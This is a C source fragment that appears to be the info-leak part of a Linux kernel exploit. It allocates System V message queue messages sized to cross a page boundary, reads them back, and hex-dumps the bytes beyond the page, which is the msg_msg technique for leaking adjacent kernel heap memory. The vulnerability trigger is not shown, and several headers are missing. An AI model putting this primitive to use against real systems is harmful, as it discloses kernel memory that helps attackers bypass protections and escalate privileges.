#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

void hexdump_memory(unsigned char *buf, size_t byte_count) {
  unsigned long byte_offset_start = 0;
  if (byte_count % 16)
    errx(1, "hexdump_memory called with non-full line");
  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
          byte_offset += 16) {
    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%08lx  ", byte_offset);
    for (int i=0; i<16; i++) {
      linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<16; i++) {
      char c = buf[byte_offset + i];
      if (isalnum(c) || ispunct(c) || c == ' ') {
        *(linep++) = c;
      } else {
        *(linep++) = '.';
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
  }
}

#define leak_size 0x1000 - 0x40 + 512 - 8
int leak_msqid;
struct {
    long mtype;
    char mtext[leak_size];
} leak_buf;

int leak_init()
{
  leak_msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
}

void leak_alloc()
{
  struct {
    long mtype;
    char mtext[leak_size];
  } msg;

  memset(msg.mtext, 0, leak_size-1);
  msg.mtype = 1;

  msgsnd(leak_msqid, &msg, sizeof(msg.mtext), 0);
}

void leak()
{
  msgrcv(leak_msqid, &leak_buf, sizeof(leak_buf.mtext), 1, 0);
}

void leak_dump()
{
  char *buf = &leak_buf.mtext[0x1000-0x40];
  int size = leak_size - 0x1000 + 0x40;
  size = size - size % 16;

  hexdump_memory(buf, size);
}
